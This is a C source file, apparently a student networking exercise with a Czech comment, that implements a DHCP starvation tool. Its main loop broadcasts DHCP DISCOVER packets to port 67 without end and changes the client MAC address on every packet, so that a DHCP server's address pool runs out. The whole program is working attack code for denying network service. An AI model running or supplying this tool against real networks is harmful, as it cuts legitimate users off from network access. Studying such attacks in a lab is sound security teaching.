#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
//#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>     // For freeBSD
#include <unistd.h>
#include <net/if.h>

#define ERROR 1

int clientSocket;

void catchSignal(int signal) {
    if (signal == SIGINT) {
        close(clientSocket);
        exit(0);
    }
}

typedef struct dhcp_message {   // Structure by rfc2131
    uint8_t op;
    uint8_t htype;
    uint8_t hlen;
    uint8_t hops;
    uint32_t xid;
    uint16_t secs;
    uint16_t flags;
    uint32_t ciaddr;
    uint32_t yiaddr;
    uint32_t siaddr;
    uint32_t giaddr;
    uint8_t chaddr[16];
    uint8_t sname[64];
    uint8_t file[128];
    uint8_t options[64];
} dhcp_message;

void setMac(uint8_t (*mac)[]) {  // Mac generator
    static uint8_t counter[] = {0, 0, 0, 0, 0, 0};

    // Toto nepekne generovani mac slo napsat urcite rozumeji.
    if (counter[5] == 255) {
        if (counter[4] == 255) {
            if (counter[3] == 255) {
                    if (counter[2] == 255) {
                        if (counter[1] == 255) {
                            if (counter[0] == 255) {
                                counter[5] = 0;
                                counter[4] = 0;
                                counter[3] = 0;
                                counter[2] = 0;
                                counter[1] = 0;
                                counter[0] = 0;
                            }
                            else {
                                counter[5] = 0;
                                counter[4] = 0;
                                counter[3] = 0;
                                counter[2] = 0;
                                counter[1] = 0;
                                counter[0]++;
                            }
                        }
                        else {
                            counter[5] = 0;
                            counter[4] = 0;
                            counter[3] = 0;
                            counter[2] = 0;
                            counter[1]++;
                        }
                    }
                else {
                        counter[5] = 0;
                        counter[4] = 0;
                        counter[3] = 0;
                        counter[2]++;
                    }
            }
            else {
                counter[5] = 0;
                counter[4] = 0;
                counter[3]++;
            }
        }
        else {
            counter[5] = 0;
            counter[4]++;
        }
    }
    else counter[5]++;

    for (int i = 0; i < 6; i++) {
        (*mac)[i] = counter[i];
    }
}

void setDhcpDiscoverMessage(dhcp_message *message) {
    bzero(message, sizeof(dhcp_message));

    message->op = 1;
    message->htype = 1;
    message->hlen = 6;

    // Magic cookie
    message->options[0] = 99;
    message->options[1] = 130;
    message->options[2] = 83;
    message->options[3] = 99;

    // DHCP message type
    message->options[4] = 53;
    message->options[5] = 1;
    message->options[6] = 1;

    // End of options
    message->options[7] = 255;
}

void debugPrintMessage(char *buffer) {
    for (int i = 0; i < 30; i++) {
        for (int j = 0; j < 10; j++) {
            printf("%02X ", buffer[i * 10 + j]);
        }
        printf("\n");
    }
}

void debugPrintMac(uint8_t mac[]) {
    printf("%02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

int main(int argc, char *argv[]) {
    // Signal behaviour
    signal(SIGINT, catchSignal);

    // Argument parsing
    char *interface;

    if (argc == 3 && !strcmp("-i", argv[1])) interface = argv[2];
    else if (argc == 2 && argv[1][0] == '-' && argv[1][1] == 'i' && argv[1][2] == '=') interface = &argv[1][3];
    else {
        fprintf(stderr, "%s: bad options\n", argv[0]);
        return(ERROR);
    }

    // Socket
    struct ifreq ifr;

    if ((clientSocket = socket(AF_INET, SOCK_DGRAM, 0)) <= 0)
    {
        fprintf(stderr, "Socket error\n");
        return(ERROR);
    }

    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);

    int broadcoastPermission = 1;
    setsockopt(clientSocket, SOL_SOCKET, SO_BROADCAST, (const void *) &broadcoastPermission , sizeof(int));

#if !(__FreeBSD__)  // # freeBSD does't support set interface this way
    if (setsockopt(clientSocket, SOL_SOCKET, SO_BINDTODEVICE, (void *)&ifr, sizeof(ifr)) < 0) {  // Set interface
        fprintf(stderr, "Bad interface. Are you root?\n");
        return(ERROR);
    }
#endif

    // Settings for sending
    char *broadcastIP = "255.255.255.255";
    struct sockaddr_in serverAddress;
    int dstPort = 67;
    dhcp_message message;

    bzero((char *) &serverAddress, sizeof(serverAddress));
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = inet_addr(broadcastIP);
    serverAddress.sin_port = htons(dstPort);

    setDhcpDiscoverMessage(&message);
    //debugPrintMessage((uint8_t *) &message);

    while (1) {
        debugPrintMac(message.chaddr);

        if (sendto(clientSocket, &message, sizeof(message), 0, (struct sockaddr *) &serverAddress,
                   sizeof(serverAddress)) != sizeof(message)) {
            fprintf(stderr, "Send error\n");
            return(ERROR);
        }

        setMac(&message.chaddr);
    }

    close(clientSocket);
}
